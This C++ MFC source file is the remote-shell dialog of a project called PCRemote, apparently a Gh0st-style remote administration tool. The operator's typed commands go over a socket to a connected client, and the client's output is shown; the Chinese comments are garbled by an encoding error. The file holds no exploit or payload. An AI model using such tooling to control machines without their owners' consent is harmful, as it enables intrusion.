// ShellDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "..\common\macros.h"

// CShellDlg �Ի���

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CShellDlg::IDD, pParent)
{
	m_pContext			= pContext;
	m_pIocpServer		= pIOCPServer;
	m_nCurSel			= 0;
	m_hIcon				= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT1, &CShellDlg::OnEnChangeEdit1)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg ��Ϣ�������


void CShellDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialogEx::OnClose();
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	RECT rectClient;
	RECT rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
	// TODO: �ڴ˴������Ϣ����������
}


BOOL CShellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	m_nCurSel = m_edit.GetWindowTextLength();//�õ���ǰ���ڵ����ݴ�С

	//�õ��ͻ��˵�IP����ʾ�����ڵı���
	CString str;
	sockaddr_in sockAddr;
	ZeroMemory(&sockAddr, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	int nResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - Զ���ն�", (nResult != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD);		//������󳤶�

	//֪ͨ�ͻ��ˣ��Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_pIocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CShellDlg::OnEnChangeEdit1()
{
	// TODO:  ����ÿؼ��� RICHEDIT �ؼ���������
	// ���ʹ�֪ͨ��������д CDialogEx::OnInitDialog()
	// ���������� CRichEditCtrl().SetEventMask()��
	// ͬʱ�� ENM_CHANGE ��־�������㵽�����С�

	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	int len = m_edit.GetWindowTextLength();
	if(len < m_nCurSel)
		m_nCurSel = len;
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT1) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);
		return CreateSolidBrush(clr);
	}
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);
	return hbr;
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (pMsg->message == WM_KEYDOWN)
	{
		//����VK_ESCAPE��VK_DELETE
		if(pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return TRUE;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			int len = m_edit.GetWindowTextLength();
			CString str;
			m_edit.GetWindowText(str);
			str += "\r\n";
			m_pIocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0)+m_nCurSel, str.GetLength()-m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
	}

	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);

		if(len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CShellDlg::OnReceiveComplete(void)
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}



void CShellDlg::AddKeyBoardData(void)
{
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString str = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	str.Replace("\n", "\r\n");
	int len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(str);
	m_nCurSel = m_edit.GetWindowTextLength();
}
